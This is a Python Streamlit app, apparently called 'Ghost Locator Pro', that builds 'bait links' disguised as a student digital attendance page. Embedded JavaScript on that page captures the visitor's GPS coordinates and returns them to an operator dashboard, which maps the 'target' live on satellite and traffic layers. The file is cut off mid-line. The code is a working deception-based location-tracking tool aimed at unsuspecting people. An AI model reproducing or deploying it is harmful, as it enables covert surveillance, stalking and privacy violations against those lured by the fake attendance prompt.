import streamlit as st
import pandas as pd
import folium
from streamlit_folium import st_folium
from streamlit_autorefresh import st_autorefresh
import datetime
import random

# --- Page Config ---
st.set_page_config(page_title="GHOST LOCATOR PRO", page_icon="🛰️", layout="wide")

# --- Custom RGB & Neon CSS Styling ---
st.markdown("""
    <style>
    .stApp { background-color: #0e1117; }
    h1 {
        color: #00ff41; 
        text-shadow: 0 0 10px #00ff41, 0 0 20px #00ff41;
        text-align: center;
        font-family: 'Courier New', monospace;
    }
    [data-testid="stSidebar"] {
        border-right: 2px solid #00f2ff;
        box-shadow: 5px 0px 15px #00f2ff;
    }
    .stMetricValue {
        color: #00f2ff !important;
        text-shadow: 0 0 5px #00f2ff;
    }
    .attendance-box {
        border: 2px solid #00f2ff;
        padding: 40px;
        border-radius: 15px;
        text-align: center;
        background: #1a1c23;
        box-shadow: 0 0 20px #00f2ff;
    }
    .stButton>button {
        background: linear-gradient(45deg, #ff00ff, #00f2ff);
        color: white;
        font-weight: bold;
    }
    </style>
    """, unsafe_allow_html=True)

# --- Handling Data from Student (URL Params) ---
query_params = st.query_params

# CHECK: If student is opening the link (Bait Mode)
if query_params.get("mode") == "attendance":
    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown("""
        <div class="attendance-box">
            <h2 style='color: #00f2ff;'>Student Digital Attendance</h2>
            <p style='color: white;'>Please click the button to mark your presence for today's session.</p>
        </div>
    """, unsafe_allow_html=True)
    
    js_code = """
    <script>
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const urlParams = new URLSearchParams(window.location.search);
                const id = urlParams.get('id') || 'Unknown';
                window.location.href = window.location.origin + window.location.pathname + "?id=" + id + "&lat=" + lat + "&lon=" + lon;
            });
        } else {
            alert("Geolocation not supported.");
        }
    }
    getLocation();
    </script>
    """
    st.components.v1.html(js_code, height=0)
    st.info("⌛ Connecting to GPS Satellite... Please wait.")
    st.stop()

# --- MAIN DASHBOARD LOGIC (For You) ---

# Auto Refresh every 5 seconds (Fixed to keep data stable)
st_autorefresh(interval=5000, key="loc_refresh")

# Fetch Coordinates from URL
current_lat = float(query_params.get("lat", 21.1702)) # Default Surat
current_lon = float(query_params.get("lon", 72.8311))
target_id = query_params.get("id", "STU-NONE")

st.title("🛰️ GHOST LOCATOR: COMMAND CENTER")

# --- Sidebar Connection Panel (Fixed Memory) ---
st.sidebar.header("📡 CONNECTION PANEL")
st.sidebar.markdown(f"**Target ID:** `{target_id}`")

# Session State to keep the link visible after refresh
if 'bait_link' not in st.session_state:
    st.session_state.bait_link = ""

if st.sidebar.button("Generate New Bait Link"):
    # APNE APP KA REAL URL YAHAN DALNA (e.g. https://xyz.streamlit.app)
    base_url = "https://your-app-name.streamlit.app" 
    new_id = f"STU_{random.randint(100,999)}"
    st.session_state.bait_link = f"{base_url}/?mode=attendance&id={new_id}"

if st.session_state.bait_link:
    st.sidebar.success("Link Active (Safe from Refresh)")
    st.sidebar.code(st.session_state.bait_link)

st.sidebar.markdown("---")
st.sidebar.info("💡 Map layers (Traffic/Satellite) upar right corner se control karein.")

# --- Dashboard Layout ---
col1, col2 = st.columns([1, 2.5])

with col1:
    st.markdown("### 📊 Live Telemetry")
    st.metric("Latitude", f"{current_lat} N")
    st.metric("Longitude", f"{current_lon} E")
    st.metric("Signal Status", "CONNECTED ✅" if "lat" in query_params else "AWAITING 📡")
    st.metric("Last Seen", datetime.datetime.now().strftime("%H:%M:%S"))
    
    if "lat" in query_params:
        st.success(f"✅ Target {target_id} is LIVE")
    else:
        st.warning("Waiting for data packet...")

with col2:
    # Map Initialization
    m = folium.Map(location=[current_lat, current_lon], zoom_start=16, tiles=None)

    # --- MAP LAYERS ---
    folium.TileLayer('cartodbdarkmatter', name='Ghost Dark Mode').add_to(m)
    folium.TileLayer('openstreetmap', name='Normal Street View').add_to(m)
    
    # Satellite View
    folium.TileLayer(
        tiles='https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}',
        attr='Google',
        name='Google Hybrid (Satellite)',
        overlay=False,
        control=True
    ).add_to(m)

    # Traffic Overlay
    folium.TileLayer(
        tiles='https://mt1.google.com/vt/lyrs=h,traffic&x={x}&y={y}&z={z}',
        attr='Google Traffic',
        name='Live Traffic (Overlay)',
        overlay=True,
        control=True
    ).add_to(m)

    # Live Target Marker
    folium.CircleMarker(
        location=[current_
